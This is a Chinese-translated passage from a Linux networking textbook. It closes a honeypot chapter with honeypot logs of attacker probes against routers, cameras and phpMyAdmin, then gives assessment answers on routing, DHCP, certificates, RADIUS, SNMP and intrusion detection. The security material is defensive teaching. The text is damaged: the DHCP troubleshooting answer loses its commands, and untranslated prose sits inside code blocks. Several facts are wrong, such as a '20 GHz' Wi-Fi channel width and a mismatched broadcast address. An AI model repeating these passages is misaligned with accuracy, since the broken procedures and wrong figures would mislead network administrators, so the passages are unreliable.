![图 14.16 – ISC SSH 报告 – 观察到的用户 ID 和密码](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_016.jpg)

图 14.16 – ISC SSH 报告 – 观察到的用户 ID 和密码

所有活动都被记录下来，因此我们确实会不时地看到针对这些攻击数据的研究项目，并且各种报告随着时间的推移而得到完善。

Web 诱饵与 SSH 诱饵有类似的配置。各种攻击的检测在`/srv/www/etc/signatures.xml`文件中更新。这些定期从互联网风暴中心的中央服务器更新，所以虽然您可以自己进行本地编辑，但这些更改很可能会在下一次更新时被“覆盖”。

当然，对诱饵的 Web 活动也都被记录下来。本地日志存储在`/srv/www/DB/webserver.sqlite`数据库中（以 SQLite 格式）。本地日志也可以在`/var/log/syslog`中通过搜索`webpy`字符串找到。

在示例诱饵中检测到的各种事物包括以下攻击者，他正在寻找 HNAP 服务。HNAP 是一个经常受到攻击的协议，通常用于控制 ISP 调制解调器的车队（[`isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648`](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)），因此 HNAP 的妥协通常会导致大量设备的妥协：

```
Jul 19 06:03:08 hp01 webpy[5825]: 185.53.90.19 - - [19/Jul/2021 05:34:09] "POST /HNAP1/ HTTP/1.1" 200 –
```

同一个攻击者还在探测`goform/webLogin`。在这个例子中，他们正在测试常见 Linksys 路由器上的最新漏洞：

```
Jul 19 06:03:08 hp01 webpy[5825]: 185.53.90.19 - - [19/Jul/2021 05:34:09] "POST /goform/webLogin HTTP/1.1" 200 –
```

这个攻击者正在寻找`boa`网络服务器。这个网络服务器有一些已知的漏洞，并且被几个不同的互联网安全摄像头制造商使用（[`isc.sans.edu/diary/Pentesters+%28and+Attackers%29+Love+Internet+Connected+Security+Cameras%21/21231`](https://isc.sans.edu/diary/Pentesters+%28and+Attackers%29+Love+Internet+Connected+Security+Cameras%21/21231)）。不幸的是，`boa`网络服务器项目已经被放弃，所以不会有修复措施：

```
Jul 19 07:48:01 hp01 webpy[700]: 144.126.212.121 - - [19/Jul/2021 07:28:35] "POST /boaform/admin/formLogin HTTP/1.1" 200 –
```

这些活动报告也会被记录在您的 ISC 门户下的**我的 404 报告**中 – 让我们看一些。这个攻击者正在寻找 Netgear 路由器，很可能是在寻找最近的任何漏洞：

![图 14.17 – ISC 404 报告 – 攻击者正在寻找易受攻击的 Netgear 服务](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_017.jpg)

图 14.17 – ISC 404 报告 – 攻击者正在寻找易受攻击的 Netgear 服务

这个攻击者正在寻找`phpmyadmin`，这是 MySQL 数据库的常见 Web 管理门户：

![图 14.18 – ISC 404 报告 – 攻击者正在寻找易受攻击的 MySQL Web 门户](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_018.jpg)

图 14.18 – ISC 404 报告 – 攻击者正在寻找易受攻击的 MySQL Web 门户

请注意，第一个例子没有用户代理字符串，因此这很可能是一个自动扫描程序。第二个例子有用户代理字符串，但老实说这很可能只是伪装；它很可能也是一个自动扫描程序，寻找公共漏洞以利用。

您现在应该对主要蜜罐类型有很好的理解，为什么您可能更喜欢其中一种而不是另一种，以及如何构建每一种蜜罐。

# 总结

这就结束了我们对蜜罐的讨论，蜜罐是一种基于网络的欺骗和延迟攻击者的方法，并在攻击进行时向防御者发送警报。您应该对主要类型的蜜罐有很好的理解，以及在作为防御者时可能最好部署每种蜜罐以实现您的目标，如何构建蜜罐以及如何保护它们。我希望您对这些方法的优势有很好的把握，并计划在您的网络中至少部署其中一些！

这也是本书的最后一章，恭喜您的毅力！我们已经讨论了在数据中心以各种方式部署 Linux，并重点介绍了这些方法如何帮助网络专业人员。在每个部分中，我们都试图涵盖如何保护每项服务，或者部署该服务的安全影响 – 通常两者兼顾。我希望本书已经说明了在您自己的网络中为一些或所有这些用途使用 Linux 的优势，并且您将能够继续选择一个发行版并开始构建！

祝您网络愉快（当然要使用 Linux）！

# 问题

最后，这里是一些问题列表，供您测试对本章材料的了解。您将在*附录*的*评估*部分找到答案：

1.  `portspoof`的文档使用了一个例子，其中所有 65,535 个 TCP 端口都发送到安装的蜜罐。为什么这是一个坏主意？

1.  您可能启用哪种端口组合来伪装为 Windows **Active Directory** (**AD**)域控制器？

# 进一步阅读

要了解更多信息，请查看以下资源：

+   Portspoof 示例：[`adhdproject.github.io/#!Tools/Annoyance/Portspoof.md`](https://adhdproject.github.io/#!Tools/Annoyance/Portspoof.md)

[`www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/`](https://www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/)

+   LaBrea 焦油坑蜜罐：[`labrea.sourceforge.io/labrea-info.html`](https://labrea.sourceforge.io/labrea-info.html)

+   在 Microsoft Exchange 中配置 Tarpit 蜜罐：[`social.technet.microsoft.com/wiki/contents/articles/52447.exchange-2016-set-the-tarpit-levels-with-powershell.aspx`](https://social.technet.microsoft.com/wiki/contents/articles/52447.exchange-2016-set-the-tarpit-levels-with-powershell.aspx)

+   WebLabyrinth：[`github.com/mayhemiclabs/weblabyrinth`](https://github.com/mayhemiclabs/weblabyrinth)

+   Thinkst Canary 蜜罐：[`canary.tools/`](https://canary.tools/)

+   互联网风暴中心的 DShield 蜜罐项目：[`isc.sans.edu/honeypot.html`](https://isc.sans.edu/honeypot.html)

[`github.com/DShield-ISC/dshield`](https://github.com/DShield-ISC/dshield)

+   斯特兰德，J.，阿萨多里安，P.，唐纳利，B.，罗比什，E.和加尔布雷斯，B.（2017）。*攻击性对策：积极防御的艺术*。CreateSpace 独立出版。


# 第十五章：评估

在接下来的页面中，我们将回顾本书各章节的所有练习问题，并提供正确答案。

# 第二章 - 基本 Linux 网络配置和操作 - 使用本地接口

1.  默认网关是一个特殊路由，通常表示为`0.0.0.0/0`（在其他二进制中，这表示“所有网络”）。主机始终具有本地路由表，具有优先顺序。

直接连接到接口的任何网络都首先进行处理。这些被称为`route`命令的`ip`命令。

最后，引用了默认路由。如果发送的流量与连接的路由或路由表中的路由不匹配，则将其发送到默认网关中定义的 IP。通常，此设备将是一个特殊的路由器或防火墙设备，该设备通常具有本地表、静态定义的路由和默认网关（以及本书范围之外的其他几种路由机制）。

1.  对于这个网络，子网掩码是`255.255.255.0`（24 位二进制）。广播地址是`192.158.25.255`。

1.  发送到广播地址的流量将发送到整个子网，并由该子网中的所有主机处理。其中一个例子是标准 ARP 请求（我们将在下一章中更深入地讨论）。

1.  主机地址可以从`192.168.25.1`到`192.168.25.254`范围。`0`地址是网络地址，因此不能用于主机。`255`地址是广播地址。

1.  `nmcli`命令是推荐的更改方法。例如，要将接口连接有线以太网 1 设置为 100 Mbps/全双工，请使用以下命令：

```
$ sudo nmcli connection modify 'Wired connection 1' 802-3-ethernet.speed 100
$ sudo nmcli connection modify 'Wired connection 1' 802-3-ethernet.duplex full
```

# 第三章 - 使用 Linux 和 Linux 工具进行网络诊断

1.  您永远不会看到这一点。从网络的角度来看，会话、连接和对话只存在于 TCP 协议（在 OSI 第 5 层）。UDP 对话是无状态的 - 网络无法将 UDP 请求与 UDP 响应关联起来 - 所有这些都必须在应用程序内部发生。通常，应用程序将在数据包中包含会话号或序列号（或两者，取决于应用程序）来完成这一点。但请记住，如果应用程序以某种方式在 UDP 上维护会话，那么应用程序有责任保持其正确 - 在 OSI 第 5 层的主机或网络上没有任何东西会像我们在 TCP 中看到的那样跟踪这一点。

1.  如果您正在解决网络或应用程序问题，这是关键信息。例如，如果您遇到可能与网络有关的应用程序问题，了解主机监听的端口可以是关键 - 例如，这些端口可能需要在主机防火墙上配置或在某些其他路径防火墙上配置。

从另一个角度来看，如果您在特定端口上看到防火墙错误，例如长时间运行的会话被终止，那么您需要将端口与应用程序联系起来。

第三个例子，当调查恶意软件时，您可能会看到与发送或监听端口相关联的恶意软件活动。能够快速诊断这一点可以使查找可能受到该恶意软件影响的其他站点变得更加简单。例如，可以使用 Nmap 找到在特定端口上监听的恶意软件，或者可以使用防火墙日志快速找到在特定端口上传输的恶意软件。这种情况的一个很好的例子是恶意软件在 DNS 端口上外泄数据 - 在这种情况下，您将寻找`tcp/53`或`udp/53`的防火墙日志条目，要么来自不是 DNS 服务器的内部主机，要么发送到不是 DNS 服务器的外部主机。在大多数公司环境中，只有 DNS 服务器应该向特定的互联网 DNS 转发主机发出 DNS 查询（有关此内容的更多详细信息，请参见*第六章*，*Linux 上的 DNS 服务*）。

1.  在一个良好运行的网络中，互联网防火墙通常会有双向规则。入站规则（从互联网到内部网络）将描述您可能希望允许互联网客户端连接的监听端口。这通常被称为“拒绝所有”作为最后一个条目，并且适当的警报通常会提醒管理员有恶意软件，不需要的软件安装在桌面或服务器上，配置错误的主机或设备，或者不属于组织网络的硬件。

1.  证书用于保护许多服务，HTTPS（在`tcp/443`上）只是最受欢迎的。证书也用于认证或保护许多其他服务。最常见的一些服务如下表所示（还有**很多**）：![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_Assesment_Table_01.jpg)

如果证书过期，在最好的情况下，连接到该服务的用户将收到错误。根据其浏览器设置，他们可能无法继续。如果连接是从程序到服务的（即不是浏览器），则连接可能会出错，这取决于应用程序错误处理和日志记录代码的编写方式。

1.  所有`1024`以下的端口都是服务器端口，因此需要管理权限才能在其中任何一个上打开监听器。

1.  假设 20 GHz 的通道宽度，通道 1、6 和 11 不会重叠。

1.  通道宽度通常会提高性能，这取决于客户端站点在媒体上尝试执行的操作。然而，在 2.4 GHz 频段，只有 11 个可用频道（并且只有 3 个选择不会产生干扰），增加通道宽度几乎肯定会增加大多数环境的干扰。在 5 GHz 频段中，有更多的频道可用，因此更有机会使用更宽的频道。

# 第四章- Linux 防火墙

1.  希望您考虑使用 nftables。虽然 iptables 在未来几年仍将得到支持，但 nftables 更高效（在 CPU 方面），并支持 IPv6。它在“匹配”流量方面也更灵活，允许更容易地匹配数据包中的各个字段以进行进一步处理。

1.  支持中央防火墙标准的简单方法（而不需要添加编排或配置管理工具）是使用`nft` `include`文件。这些文件可以在单个位置进行管理，赋予有意义的名称，然后复制到符合每个`include`文件用例的目标服务器上。例如，通常会看到为 Web 服务器，DNS 主机或 DHCP 服务器创建一个`include`文件。另一个非常常见的用例是创建一个单独的`include`文件，以允许仅从一小组管理“跳转主机”，地址范围或子网进行主机管理。

即使没有`include`文件，编排工具如 Terraform，Ansible，Puppet，Chef 或 Salt 也可以用于集中管理 Linux 主机和服务的许多方面，包括防火墙。在这种情况下，至少明智地硬编码编排工具所需的访问权限-发现编排工具中的简单配置错误刚刚删除了对服务器群的所有管理访问权限是不愉快的。

# 第五章-具有现实生活示例的 Linux 安全标准

1.  可悲的是，此时美国没有任何联邦隐私立法。希望这在不久的将来会改变！

1.  不，关键控件并不是作为审计框架。但是，您当然可以根据它们进行评估。

例如，在关键控制 1 中，建议为网络访问部署 802.1x 认证。这意味着您的工作站和/或用户帐户需要向网络“认证”，认证过程决定了该站点和用户 ID 组合可以访问什么。虽然这不是一个审计项目（它不讨论具体的设置或特定的服务或访问权限），但您是否在您的基础设施中实施了 802.1x 可以在更大的安全程序或一系列项目中进行评估。

1.  对此的第一个答案是，第一个检查可能不准确，视差视图可以帮助确定这一点。例如，如果进行了更改，但操作系统或应用程序错误意味着配置更改没有正确实施，那么第二个工具来评估设置就可以识别出这一点。

更重要的是，配置更改和检查通常是在主机上本地进行的，并且需要逐个主机重复。通过“通过网络”评估设置，例如使用 Nmap 扫描，可以让您在几分钟内评估数百台主机。这不仅节省时间，而且也是审计员、渗透测试人员和恶意软件使用的节省时间的方法。

# 第六章 – Linux 上的 DNS 服务

1.  DNSSEC 实现了允许“签名”以验证 DNS 响应数据的记录。它既不加密请求也不加密响应，因此可以使用标准的 DNS 端口 `udp/53` 和 `tcp/53` 运行。DoT 完全使用 TLS 加密 DNS 请求和响应。因为 DoT 是一个完全不同的协议，它使用端口 `tcp/853`。

1.  DoH 作为一个 API 运行——请求和响应都在特定的 HTTP 头部的 HTTPS 流量中传输。DoT `/dns-query`，由于使用了 HTTPS 传输，该协议只使用 `tcp/443`。

1.  内部 DNS 服务器肯定会实现递归和转发器，以允许解析互联网主机。通常情况下，自动注册是启用的，并且请求通常仅限于组织内的“已知”子网。

组织区域的外部 DNS 服务器通常不会实现递归或转发器，几乎永远不会实现自动注册。几乎总是实现某种形式的速率限制。

# 第七章 – Linux 上的 DHCP 服务

1.  首先，这可能只是打电话给帮助台的人的问题。确保这是一个分公司范围的问题。确保打电话的人已经插入网络（或者如果他们是无线的，确保他们已经正确关联）。确保他们不是在家工作；如果他们甚至不在办公室，那么这很可能不是您服务器的问题。

完成了“我们有问题吗”的问题后，看看你是否能在远程办公室找到任何东西。如果 WAN 链路、VPN 链路、路由器或办公室的交换机都没有工作，那么 DHCP 也不会工作。在深入研究 DHCP 方面之前，请确保您可以 ping 或以其他方式测试这些设备中的每一个。

接下来，首先确保 DHCP 服务器实际上正在工作。检查服务是否正在运行——请注意，以下 `systemctl` 命令为您提供了一些最近的 DHCP 数据包信息：

```
ss command, to see whether the server is listening on the correct UDP port. Note that this doesn't verify that it's actually the DHCP server that is listening on port 67/udp (bootups), but it would truly be an odd day if it was something else:

```

使用 tail 命令只提取最后几个日志条目。如果日期不是今天的，请注意日期，以查看 DHCP 上次分配地址的时间。您可能已经从 systemctl 输出中得到了这个信息，但您也可以从 syslog 中获取：

```
67/udp (bootups).At this point, you have checked pretty much everything. It is now time to check again that the routers and switches in the office are powered on, and that people haven't re-cabled anything in that office over the weekend. It's also worth checking again that the person who's reporting the problem is actually in the office. It may seem odd, but also ask if the lights are on – you'd be surprised how often people call in a network outage when what they really have is an extended power outage.If all that fails, proceed with *Question 2*. You may have a rogue DHCP server in that office and the Helpdesk may not have identified this problem yet.
```

```

```

1.  在任何 Linux 客户端上，获取 DHCP 服务器的 IP。有几种方法可以做到这一点。您可以检查 `syslog` 文件：

```
$ sudo cat /var/log/syslog | grep DHCPACK
Mar 19 12:40:32 ubuntu dhclient[14125]: DHCPACK of 192.168.1.157 from 192.168.1.1 (xid=0xad460843)
```

或者只需从工作站上的 DHCP 客户端租约文件中转储服务器信息（这会在各种客户端接口更新时更新）：

```
$ cat /var/lib/dhcp/dhclient.leases | grep dhcp-server
  option dhcp-server-identifier 192.168.1.1;
  option dhcp-server-identifier 192.168.1.1;
```

最后，你可以在前台更新租约并从那里获取信息。请注意，如果你通过 SSH 连接到客户端，你的地址可能会因为这种方法而改变。客户端也会在这里显示的最后一行上“挂起”。请记住，这是在前台运行的后台 DHCP 客户端进程，所以不是“挂起”，而是“等待”。按下*Ctrl + C*退出：

```
$ sudo dhclient –d 
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Listening on LPF/ens33/00:0c:29:33:2d:05
Sending on   LPF/ens33/00:0c:29:33:2d:05
Sending on   Socket/fallback
DHCPREQUEST for 192.168.1.157 on ens33 to 255.255.255.255 port 67 (xid=0x7b4191e2)
DHCPACK of 192.168.1.157 from 192.168.1.1 (xid=0xe291417b)
RTNETLINK answers: File exists
bound to 192.168.1.157 -- renewal in 2843 seconds.
```

或者，如果远程客户端是基于 Windows 的，有一个简单的命令可以获取 DHCP 服务器地址：

```
> ipconfig /all | find /i "DHCP Server"
   DHCP Server . . . . . . . . . . : 192.168.1.1
```

无论你如何获取 DHCP 服务器 IP 地址，如果你从你的故障排除中得到的 IP 地址不是你的服务器，那么你就有一个流氓 DHCP 问题。

由于我们现在有了 DHCP IP 地址，从受影响的主机快速 ping 它，然后收集流氓服务器的 MAC 地址：

```
$ arp –a | grep "192.168.1.1"
_gateway (192.168.1.1) at 00:1d:7e:3b:73:cb [ether] on ens33
```

从 OUI 中获取有问题设备的制造商。在这种情况下，这是一个 Linksys 家用路由器。你可以很容易地从 Wireshark OUI 查找站点([`www.wireshark.org/tools/oui-lookup.html`](https://www.wireshark.org/tools/oui-lookup.html))获取这个信息，或者如*第二章*中所述，*基本 Linux 网络配置和操作-使用本地接口*，我在 GitHub 上托管了一个脚本([`github.com/robvandenbrink/ouilookup`](https://github.com/robvandenbrink/ouilookup))。

现在去你的交换机（或者让你的网络人员参与进来），找出那个主机连接的交换机端口。注意，我们只是在寻找 MAC 地址的最后一部分：

```
# show mac address-table | i 73cb
* 1        001d.7e3b.73cb    dynamic   20         F    F   Gi1/0/7
```

在这一点上，你可能想要开始关闭那个端口并开始打电话。一定要确保你在这样做时不要关闭连接整个交换机的端口。首先检查该端口上的其他 MAC 地址，特别是查找 MAC 地址的计数：

```
# show mac address-table int Gi1/0/7
```

还要检查该端口的 LLDP 邻居列表-它应该告诉你那里是否有一个交换机：

```
# show lldp neighbors int g1/0/7 detailed
```

此外，查找该端口上的 CDP 邻居，同时查找交换机：

```
# show cdp neighbors int g1/0/7
```

如果该端口上有一个交换机，连接到相邻的交换机并重复这个过程，直到找到你的有问题的 DHCP 服务器的端口。

关闭有问题的端口后，你的用户应该能够重新开始获取 DHCP 地址。由于你有服务器的 OUI，你的下一步是要求办公室的一个值得信任的人去寻找一个上面贴有<插入品牌名称>标签的新盒子。

# 第八章- Linux 上的证书服务

1.  第一个功能是最重要的，也是最容易被忽视的。证书提供了信任和身份验证。主机名与证书中的 CN 或 SAN 字段匹配提供了启动会话所需的身份验证。证书由受信任的 CA 签名意味着客户端可以信任身份验证。这将在本书的下一章*第九章*中再次讨论，*Linux 的 RADIUS 服务*。

第二个功能是证书材料用于提供用于对后续会话进行对称加密的密钥的一些材料。但需要注意的是，随着我们进展到其他用例，许多使用证书的情况根本不进行会话加密——证书纯粹用于身份验证。

1.  `PKCS#12`格式，通常以`.pfx`或有时`.p12`为后缀，将服务的公共证书与其私钥结合在一起。这种组合通常在正常安装过程可能会得到通常有一个*让我们从 CSR 开始*的起点，但证书是一个预先存在的，比如通配符的情况下是必需的。

1.  CT 在公共 CA 所需的信任模型中至关重要。由于所有证书都是公开发布的，这意味着 CT 日志可以进行欺诈证书的审计。

作为一个附带好处，这意味着组织可以审计发放给他们的证书，以防止未经授权购买的证书，以及以前未知的服务。这有助于遏制非 IT 部门直接购买 IT 服务的*影子 IT*的蔓延，超出了正常渠道。

1.  虽然 CA 在发放证书后从未被咨询，但保留已发放证书的详细信息有几个原因，如下所述：

+   最重要的原因是*信任*。保留已发放证书的注册表意味着可以对此列表进行审计。

+   第二个原因也是*信任*。保留已发放证书的日志意味着当您需要撤销一个或多个证书时，您可以通过`index.txt`文件中的名称识别它们，然后使用它们的序列号（与它们的文件名匹配）来撤销这些证书。

+   最后，当操作内部 CA 和服务器基础设施时，通常会达到一个疑难解答的时刻，您会说*几乎就像那个证书来自其他地方*——例如，它可能是自签名的，或者可能是由另一个 CA 发放的。虽然您可以从证书本身获取这些信息，但私人 CA 上的索引为您提供了检查哪些证书是通过其他方法何时发放的所需工具。

例如，如果攻击者建立了一个与您相同名称的恶意 CA，这样您可以快速检查而无需使用`openssl`命令验证密钥和签名。

更糟糕的是，如果攻击者使用从您实际服务器中窃取的（有效的）密钥材料构建了恶意 CA，那么真实 CA 上的索引文件将是您指向最终诊断的唯一线索。

# 第九章-用于 Linux 的 RADIUS 服务

1.  使用同时引用身份验证请求和后端组成员资格的`unlang`规则是解决此问题的经典方法。规则应指定以下内容：

1.  如果您正在提出 VPN 请求，则需要加入“VPN 用户”组进行身份验证。

1.  如果您正在提出管理访问请求，则需要加入“网络管理员”组。

1.  这种方法可以扩展到包括任意数量的身份验证类型、设备类型、RADIUS 属性值和组成员资格。

提供所请求功能的一个示例`unlang`规则可能如下所示：

```
if(&NAS-IP-Address == "192.168.122.20") {
    if(Service-Type == Administrative && LDAP-Group == "Network Admins") {
            update reply {
                Cisco-AVPair = "shell:priv-lvl=15"
} 
            accept
} 
    elsif (Service-Type == "Authenticate-Only" && LDAP-Group == "VPN Users" ) {
        accept
    }
    elsif {
        reject
    }
}
```

1.  有几个原因，这些在这里概述：

1.  由于它使用证书，并且通常使用本地证书存储，整个信任模型

1.  因为它使用 TLS-如果实施正确，那么对身份验证交换的加密的攻击是一个重大挑战。

1.  每个无线用户都有自己的会话密钥，这些密钥经常轮换。

1.  攻击者无法捕获或利用密码。所有其他无线身份验证和加密机制都使用用户 ID/密码（例如 PEAP）或预共享密钥。

1.  部署 EAP-TLS 的障碍在于准备工作，特别是在 RADIUS 服务器和端点客户端上发布和安装证书。在典型的组织中，这是完全可行的，其中工作站由公司拥有，或者您可以指导员工在其拥有的任何授权设备上安装证书。此外，移动设备管理（MDM）平台可用于在手机和平板电脑上发布和安装证书。

然而，如果设备不是公司所有，例如，如果设备是顾问或供应商的笔记本电脑或员工拥有的家用电脑，那么在该设备上安全地发放和安装公司证书可能是一个真正的挑战。特别是，常见的情况是看到**证书签名请求**（**CSR**）和证书通过电子邮件来回发送，这不建议用于传输此类敏感数据。

MFA 解决方案保留了用户 ID 密码界面，用于诸如 VPN 服务之类的事物，但消除了这些界面的密码填充或暴力攻击的风险。此外，将远程站点注册到 Google Authenticator 等系统中非常简单——只需扫描您获得的 QR 码即可完成！

# 第十章–Linux 负载均衡器服务

1.  如果您的总负载可能达到负载均衡器的容量，DSR 解决方案意味着只有客户端到服务器的流量需要通过负载均衡器路由。这对大多数工作负载来说影响很大，因为大多数工作负载的返回流量（服务器到客户端）要比发送流量（从客户端到服务器）多得多。这意味着改用 DSR 解决方案可以很容易地将通过负载均衡器的流量减少 90%。

如果较小的负载均衡器与需要平衡的每个离散工作负载匹配 1:1，那么性能就不太重要了。特别是在虚拟化环境中，向基于 VM 的负载均衡器添加 CPU 和内存资源也比在传统的基于硬件的设备情况下进行硬件升级要简单得多。

DSR 负载均衡器还需要相当多的服务器和网络“调整”才能使所有部件正常工作。一旦它工作，当需要排除故障时，再次弄清楚所有这些可能会成为一个真正的问题。

DSR 解决方案在客户端和服务器之间的流量中也会失去一些智能，因为只能看到对话的一半。

1.  您会使用基于代理的负载均衡器的主要原因是允许在 HTTPS 设置中进行会话持久性。这通过在前端虚拟 IP（VIP）上终止客户端会话，然后在后端接口上启动新的 HTTPS 会话来实现。这种方法允许负载均衡器在此方程式的客户端部分插入一个 cookie。当客户端发送下一个请求（其中将包括此 cookie）时，负载均衡器将会将会话引导到分配给此客户端 HTTPS 会话的服务器。

# 第十一章–Linux 中的数据包捕获和分析

1.  您会从中间设备捕获出于几个原因：

+   您无法访问任一端的主机，也没有权限在它们上捕获数据包。

+   您无法访问允许您使用主机和 Wireshark 的交换机端口，要么是因为您不在现场，要么是因为没有交换机访问权限。

+   如果中间设备是防火墙，从那里进行捕获将允许您考虑 NAT（在翻译之前和之后进行捕获），以及防火墙上的任何 ACL。

+   如果您正在解决主机服务问题并且可以访问任一主机并且有权限在一个或两个主机上安装数据包捕获工具，那么您可以从任一端捕获。此外，从任一端捕获可能允许您在解密之前或之后捕获加密流量。

+   使用 SPAN 端口进行捕获几乎是所有情况下的首选解决方案。这允许您捕获任一方向的流量，但不需要访问或权限更改任一端点主机。

1.  tcpdump 是 Linux 上的底层数据包捕获机制。几乎所有工具，包括 Wireshark 都使用 tcpdump。Wireshark 的优势在于它为操作员提供了一个 GUI 界面，这对那些不擅长“CLI 人员”来说非常有吸引力。此外，Wireshark 将完全解码数据包，并允许您使用显示过滤器交互式地深入到目标流量中。

另一方面，TCPdump 的优势在于它可以在任何地方运行，这在捕获会话通过 SSH 会话运行时非常有吸引力，或者如果进行捕获的主机没有运行 GUI。 TCPdump 还可以让您更好地控制会影响捕获性能或容量的低级功能。例如，环形缓冲区的大小可以很容易地从`tcpdump`命令行进行修改。

1.  RTP 协议的端口将在每次呼叫中都不同。它们始终是 UDP，但会在呼叫设置期间通过 SIP/SDP（特别是通过`INVITE`数据包）进行协商。 

# 第十二章-使用 Linux 进行网络监控

1.  SNMP 的写访问权限允许您监视（读取）设备或主机参数，并设置（写入）相同的参数。因此，通过读写访问权限，您可以更改接口速度或双工，重新启动或关闭设备，或下载配置。有一个 nmap 脚本可以使这样的配置下载变得简单：`snmp-ios-config.nse`。

1.  Syslog 通常以明文形式通过`514/udp`发送。有一个选项可以使用 IPSEC 加密这些流量，但它并没有被广泛实现。风险在于敏感信息是通过 syslog 发送的，因为它是明文，所以任何有能力阅读它的人都可以收集这些信息以备后用，或者在发送时对其进行修改。

例如，管理员通常会将他们的密码放在`userid`字段中，这意味着密码在那一点上可能已经泄露。这个人通常会采取的下一步是再次尝试，这意味着攻击者现在既有 userid 又有密码。然而，您希望记录这些信息，以帮助检测恶意登录尝试。

一种选择是启用 SNMPv3 并使用 SNMPv3 陷阱来记录日志，而不是使用 Syslog。然而，这将把您的日志平台转移到通常不太灵活且更难使用的平台。

要在 Cisco IOS 设备上启用 SNMPv3 陷阱，请使用以下代码：

```
snmp-server enable traps
!
! … this can also be done in a more granular fashion:
! snmp-server enable traps envmon fan shutdown supply temperature status ospf cpu
!
! EngineID is automatically generated by the router, use "show snmp engineID" to check
snmp-server engineID remote <server ip address> 800005E510763D0FFC1245N1A4
snmp-server group TrapGroup v3 priv
snmp-server user TrapUser TrapGroup remote <server ip address> v3 auth sha AuthPass priv 3des PSKPass
snmp-server host <server ip address>  informs version 3 priv TrapUser
```

您的 SNMP 陷阱服务器必须具有匹配的帐户信息和加密选项。如果您走到这一步，您还必须为发送陷阱的每个设备硬编码主机信息。

1.  NetFlow 收集和汇总网络流量的摘要信息。至少包括源 IP、目的 IP、协议、源端口号和目的端口号的“元组”。通常由收集服务器添加时间以进行分析，以便可以组合和相关多个服务器的流量，而无需担心各种网络设备之间的时钟漂移。

尽管如此，发送的信息通常不是敏感的-基本上，它是源和目的地 IP 地址以及所使用应用程序的猜测（通常是从目的地端口推导出来的）。大多数组织不会认为这是敏感信息。

然而，如果您的组织认为这是一个风险，那么将这些数据通过 IPSEC 隧道传回到收集服务器就足够简单了。这个架构可能有些棘手，因为您可能需要维护两个路由**虚拟路由框架**（**VRFs**）来实现这一点，但这当然是可行的。也许更简单的方法是加密所有 WAN 流量，然后在核心路由器和 NetFlow 收集服务器之间应用第 2 层保护（假设它们在同一子网上）。

# 第十三章- Linux 上的入侵防范系统

1.  Zeek 将是您的首选工具。正如我们在 Zeek 示例中看到的，通过特定时间窗口内的所有流量快速钻取到特定的 TLS 版本。在搜索过程中添加地理位置信息只需要几次鼠标点击。源和目的地 IP 地址在您缩小搜索范围时为您总结，因此不需要采取额外的行动来收集它们。

1.  SSH 客户端在使用时会生成流量。诸如 P0F（或商业工具如 Teneble PVS）之类的工具可以被动地收集所有流量，然后将这些流量与客户端工作站关联起来。通过使用诸如 JA3 或 HASSH 之类的算法，被动收集的数据通常可以告诉您有关客户端应用程序的信息，甚至可以精确到其版本。这使您可以针对过时的客户端进行软件升级。

PuTTY 就是一个很好的例子，因为这个应用程序通常不是使用完整的基于 MSI 的 Windows 安装程序安装的。这意味着通常不容易使用 PowerShell 或商业清单工具进行清点。

这种方法的缺点是只能在应用程序使用时对目标应用程序进行清点。识别硬件客户端-例如，未经授权的**物联网**（**IoT**）设备-特别有效，因为这些设备倾向于非常频繁地与各种云服务联系。

1.  首先，故意将 IPS 放置在防火墙的公共互联网侧在当今并不是很有效，考虑到该网络的敌对性-它将不断发出警报，这将导致太多的“噪音”需要过滤。

将 IPS 放置在主要捕获出站流量或绕过防火墙的入站流量的位置，可以大大减少评估的流量，将其缩小到潜在的攻击流量（入站）和可能指示内部主机受到威胁的流量（出站）。这种放置通常是在 SPAN 端口上，监视防火墙的内部和 DMZ 接口。这可能扩展到其他端口或整个 VLAN（参考*第十一章*，*Linux 中的数据包捕获和分析*中的 SPAN 端口部分）。

将 IPS 放置在可以检查解密流量的位置，可以评估否则“不可见”的有效载荷；例如，在 RDP、SSH 或 HTTPS 流量中。在现代架构中，这通常意味着 IPS 实际上位于防火墙本身上，通常被称为**统一威胁管理**（**UTM**）防火墙或**下一代防火墙**（**NGFW**）。

# 第十四章- Linux 上的蜜罐服务

1.  蜜罐被部署来“拍摄”攻击者的流量。特别是在内部网络上，它们的主要目标是让攻击者在蜜罐主机上忙碌足够长的时间，以便你可以采取一些防御措施。

点亮一个主机上意想不到的端口组合会立即暴露你的攻击者，目标是一个蜜罐。他们不仅会跳过那个主机，而且会更加谨慎地继续，知道你部署了蜜罐。

1.  AD 域控制器通常启用了许多这些端口：

![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_Assesment_Table_02.jpg)

这个列表并不完整，重点是 TCP 端口。攻击者通常会完全跳过扫描 UDP 端口，特别是如果开放的 TCP 端口的配置足以识别目标主机。

在互联网上，例外情况将是对`500/udp`和`4500/udp`的扫描，这通常表示开放的 VPN 端点。
